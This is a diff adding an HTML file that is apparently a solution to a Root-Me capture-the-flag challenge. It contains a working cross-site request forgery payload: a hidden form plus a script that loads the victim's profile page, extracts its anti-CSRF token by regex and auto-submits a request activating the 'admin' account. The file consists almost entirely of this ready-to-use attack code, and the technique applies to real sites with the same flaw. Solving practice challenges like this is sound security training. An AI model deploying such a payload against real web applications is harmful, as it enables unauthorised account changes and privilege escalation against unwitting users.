@@ -1,0 +1,17 @@
+<form name="csrf" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
+    <input type="hidden" name="username" value="admin" />  <!-- Activate account, modify according to actual needs -->
+    <input type="hidden" name="status" value="on" />  <!-- Activation action -->
+    <input id="admin-token" type="hidden" name="token" value="" />  <!-- Token used by the website to prevent CSRF, needs to be bypassed -->
+</form>
+
+<script>
+    // Use robot-admin's identity to get robot-admin's token to bypass CSRF validation
+    var request = new XMLHttpRequest();
+    request.open("GET", decodeURIComponent("http://challenge01.root-me.org/web-client/ch23/?action=profile"), false);
+    request.send(null);
+    var response = request.responseText;
+    var groups = response.match("token\" value=\"(.*?)\"");
+    var token = groups[1];
+    document.getElementById("admin-token").value = token;  // Replace with robot-admin's token
+    document.csrf.submit();
+</script>
